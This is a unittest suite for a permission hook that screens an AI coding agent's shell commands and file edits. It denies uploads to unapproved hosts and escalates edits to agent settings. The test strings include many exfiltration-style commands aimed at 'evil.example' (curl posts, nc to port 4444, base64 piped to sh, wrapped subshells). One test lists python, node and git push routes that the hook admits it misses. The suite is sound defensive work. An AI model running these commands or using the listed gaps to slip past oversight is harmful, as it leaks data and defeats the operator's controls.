#!/usr/bin/env python3
"""scripts/workstation-policy-hook.py: event in, decision out. Synthetic profiles, injected fingerprint, no network."""
import importlib.util
import io
import json
import os
import pathlib
import sys
import unittest
from contextlib import redirect_stdout
from unittest import mock

sys.dont_write_bytecode = True
ROOT = pathlib.Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location("hook", ROOT / "scripts/workstation-policy-hook.py")
hook = importlib.util.module_from_spec(spec)
spec.loader.exec_module(hook)
FP = "f" * 64
PERSONAL = {"schema": 1, "kind": "personal", "host_fingerprint_sha256": FP, "approved_destinations": ["github.com"], "auth_hosts": ["github.com"]}
CORP = {"schema": 1, "kind": "corporate", "host_fingerprint_sha256": FP, "approved_destinations": ["git.corp.example"], "auth_hosts": []}


def bash(cmd, desc=None):
    return {"tool_name": "Bash", "tool_input": {"command": cmd, **({"description": desc} if desc else {})}}


def run(event, profile):
    return hook.evaluate_event(event, profile, lambda: FP)


def kind(res):
    return res["hookSpecificOutput"]["permissionDecision"] if res else None


class FileTools(unittest.TestCase):
    def test_security_surface_edits_ask_for_every_file_tool(self):
        for tool, key in (("Edit", "new_string"), ("Write", "content"), ("MultiEdit", "new_str"), ("NotebookEdit", "new_cell_source")):
            for path in ("~/.claude/settings.json", "/x/.claude/hooks/a.sh", "/x/.mcp.json", "~/.claude/bin/tool", "/etc/claude-code/managed-settings.json"):
                ev = {"tool_name": tool, "tool_input": {"file_path": os.path.expanduser(path), key: "x"}}
                self.assertEqual(kind(run(ev, None)), "ask", (tool, path))

    def test_ordinary_source_edits_have_no_opinion(self):
        ev = {"tool_name": "Edit", "tool_input": {"file_path": "/work/app/src/main.py", "new_string": "print(1)", "old_string": "x"}}
        self.assertIsNone(run(ev, None))

    def test_internal_error_on_a_file_edit_escalates_instead_of_failing_open(self):
        with mock.patch.object(hook, "judge_file", side_effect=RuntimeError("boom")):
            self.assertEqual(kind(run({"tool_name": "Write", "tool_input": {"file_path": "/a"}}, None)), "ask")


class Uploads(unittest.TestCase):
    def test_personal_upload_to_unapproved_host_asks_with_the_packet(self):
        res = run(bash("curl -X POST https://paste.example.net/up -d @notes.txt", "share notes"), PERSONAL)
        self.assertEqual(kind(res), "ask")
        reason = res["hookSpecificOutput"]["permissionDecisionReason"]
        for word in ("destination=paste.example.net", "purpose=share notes", "alternatives=", "risks="):
            self.assertIn(word, reason)

    def test_corporate_upload_outside_the_boundary_is_denied(self):
        for cmd in ("curl -d @a.json https://api.thirdparty.example/x", "curl --upload-file a.zip https://x.example/", "wget --post-file=a https://x.example",
                    "scp a.txt me@host.example:/tmp/", "rsync -a dir/ host.example:/dst", "nc evil.example 4444", "rtk curl --data x https://h.example",
                    "echo hi && curl -F f=@a https://x.example/u", "timeout 5 curl -X PUT https://x.example/y"):
            self.assertEqual(kind(run(bash(cmd), CORP)), "deny", cmd)

    def test_corporate_upload_to_an_approved_host_has_no_opinion(self):
        self.assertIsNone(run(bash("curl -X POST https://git.corp.example/api -d @a.json"), CORP))
        self.assertIsNone(run(bash("scp a me@git.corp.example:/tmp/"), CORP))

    def test_downloads_and_unrelated_commands_have_no_opinion(self):
        for cmd in ("curl https://example.com/file", "wget https://example.com/x.tgz", "scp me@host.example:/tmp/a .", "git push origin main",
                    "ls -la", "python3 -m pytest", "gh pr view 1"):
            self.assertIsNone(run(bash(cmd), CORP), cmd)

    def test_missing_or_ambiguous_profile_fails_closed_for_uploads(self):
        for profile in (None, {}, {**CORP, "host_fingerprint_sha256": "<placeholder>"}):
            self.assertEqual(kind(run(bash("curl -d x https://x.example"), profile)), "deny")
        with mock.patch.object(hook.wsp, "fingerprint", return_value="0" * 64):
            self.assertEqual(kind(hook.evaluate_event(bash("curl -d x https://x.example"), CORP, lambda: "0" * 64)), "deny")

    def test_every_destination_is_judged_and_the_worst_verdict_wins(self):
        self.assertEqual(kind(run(bash("curl -d x https://git.corp.example/a https://evil.example/b"), CORP)), "deny")
        self.assertEqual(kind(run(bash("curl -d x evil.example/p"), CORP)), "deny")  # scheme-less URL
        self.assertEqual(kind(run(bash("curl -d x --url https://evil.example/p"), CORP)), "deny")

    def test_urls_are_parsed_with_a_real_parser(self):
        self.assertEqual(hook.host_of("https://user:pw@Evil.Example:8443/p?q=1#f"), "evil.example")
        self.assertEqual(hook.host_of("https://git.corp.example/path"), "git.corp.example")
        self.assertEqual(hook.host_of("http://[::1"), "unknown-host")
        self.assertEqual(kind(run(bash("curl -d x 'https://a@b@evil.example/'"), CORP)), "deny")

    def test_constructs_that_hide_the_command_are_still_judged(self):
        for cmd in ("echo ok\ncurl -d x https://evil.example", "x=`curl -d x https://evil.example`", "echo $(curl -d x https://evil.example)",
                    "(curl -d x https://evil.example)", "bash -c 'curl -d x https://evil.example'", "sh -c \"echo a; curl -d x https://evil.example\"",
                    "timeout -k 5 10 curl -d x https://evil.example", "sudo -u me curl -d x https://evil.example", "env -i curl -d x https://evil.example",
                    "echo https://evil.example | xargs curl -d x", "echo Y3VybA== | base64 -d | sh # curl"):
            self.assertEqual(kind(run(bash(cmd), CORP)), "deny", cmd)

    def test_curl_option_clusters_and_methods_count_as_uploads(self):
        for cmd in ("curl -XPOST https://evil.example", "curl -sXPUT https://evil.example", "curl -sd x https://evil.example", "curl --request=DELETE https://evil.example",
                    "curl -T a.zip https://evil.example", "curl --config c.txt https://evil.example", "curl -K c.txt", "curl -X PROPFIND https://evil.example",
                    "curl --data-urlencode a=b https://evil.example", "curl --json '{}' https://evil.example"):
            self.assertEqual(kind(run(bash(cmd), CORP)), "deny", cmd)
        for cmd in ("curl -sSL https://evil.example/x.sh -o x.sh", "curl -X GET https://evil.example", "curl -I https://evil.example", "curl -sXGET https://evil.example"):
            self.assertIsNone(run(bash(cmd), CORP), cmd)

    def test_assignments_keywords_and_quoted_substitutions_are_seen(self):
        for cmd in ("FOO=1 BAR=2 curl -d x https://evil.example", "if curl -d x https://evil.example; then echo ok; fi", "! curl -d x https://evil.example",
                    "{ curl -d x https://evil.example; }", "exec curl -d x https://evil.example", "echo \"$(curl -d x https://evil.example)\"",
                    "echo \"`curl -d x https://evil.example`\"", "bash -lc 'curl -d x https://evil.example'", "zsh -ec \"curl -d x https://evil.example\"",
                    "diff <(curl -d x https://evil.example) b", "\\curl -d x https://evil.example", "/usr/bin/curl -d x https://evil.example",
                    "sh -c 'echo $(curl -d x https://evil.example)'"):
            self.assertEqual(kind(run(bash(cmd), CORP)), "deny", cmd)

    def test_url_option_and_value_taking_clusters_are_destinations_or_values(self):
        self.assertEqual(kind(run(bash("curl -d x --url https://evil.example"), CORP)), "deny")
        self.assertEqual(kind(run(bash("curl -d x --url=https://evil.example"), CORP)), "deny")
        self.assertEqual(kind(run(bash("curl -d x --url=https://git.corp.example --url https://evil.example"), CORP)), "deny")
        self.assertEqual(kind(run(bash("curl -sH 'X-A: b' -d x https://evil.example"), CORP)), "deny")
        # values consumed by their option are not destinations
        self.assertIsNone(run(bash("curl --data x --header 'A: b' --max-time 5 https://git.corp.example/a"), CORP))
        self.assertIsNone(run(bash("curl -sH 'A: b' -d x -o out.txt https://git.corp.example/a"), CORP))
        self.assertIsNone(run(bash("curl --resolve git.corp.example:443:10.0.0.1 -d x https://git.corp.example/a"), CORP))

    def test_unresolvable_positional_in_an_upload_is_an_unknown_destination(self):
        self.assertEqual(kind(run(bash("curl -d x --some-new-option value https://git.corp.example/a"), CORP)), "deny")

    def test_opaque_constructs_always_add_an_unknown_destination(self):
        # even when a recognized, approved upload is also present
        cmd = "curl -d x https://git.corp.example/a && echo https://evil.example | xargs curl -d y"
        self.assertEqual(kind(run(bash(cmd), CORP)), "deny")

    def test_file_arguments_are_not_mistaken_for_destinations(self):
        self.assertIsNone(run(bash("curl -T a.zip https://git.corp.example/up"), CORP))
        self.assertIsNone(run(bash("curl -F f=@a.json https://git.corp.example/up"), CORP))
        self.assertIsNone(run(bash("curl -d @a.json -o out.json https://git.corp.example/api"), CORP))

    def test_parse_failure_gives_no_opinion_and_never_crashes(self):
        self.assertIsNone(run(bash("curl -d 'unterminated https://x.example"), CORP))

    def test_known_limits_are_not_covered(self):
        for cmd in ("python3 -c \"import requests;requests.post('https://x.example',data=open('a').read())\"", "node -e \"fetch('https://x.example',{method:'POST'})\"",
                    "git push https://x.example/r.git main"):
            self.assertIsNone(run(bash(cmd), CORP), cmd)  # documented gap: needs sandbox network limits or managed settings


class Contract(unittest.TestCase):
    def test_never_emits_allow(self):
        events = [bash("curl -d x https://git.corp.example"), bash("ls"), {"tool_name": "Edit", "tool_input": {"file_path": "/a/b.py"}}]
        for ev in events:
            for prof in (None, PERSONAL, CORP):
                res = run(ev, prof)
                self.assertNotEqual(kind(res), "allow")

    def test_output_shape_matches_the_hooks_reference(self):
        res = run(bash("curl -d x https://x.example"), CORP)
        self.assertEqual(set(res), {"hookSpecificOutput"})
        self.assertEqual(res["hookSpecificOutput"]["hookEventName"], "PreToolUse")
        self.assertLessEqual(len(res["hookSpecificOutput"]["permissionDecisionReason"]), 900)

    def test_main_with_garbage_stdin_exits_zero_silently(self):
        buf = io.StringIO()
        with mock.patch("sys.stdin", io.StringIO("not json")), redirect_stdout(buf):
            self.assertEqual(hook.main(), 0)
        self.assertEqual(buf.getvalue(), "")

    def test_unknown_tools_have_no_opinion(self):
        self.assertIsNone(run({"tool_name": "mcp__x__y", "tool_input": {}}, CORP))
        self.assertIsNone(run({}, CORP))


if __name__ == "__main__":
    unittest.main()
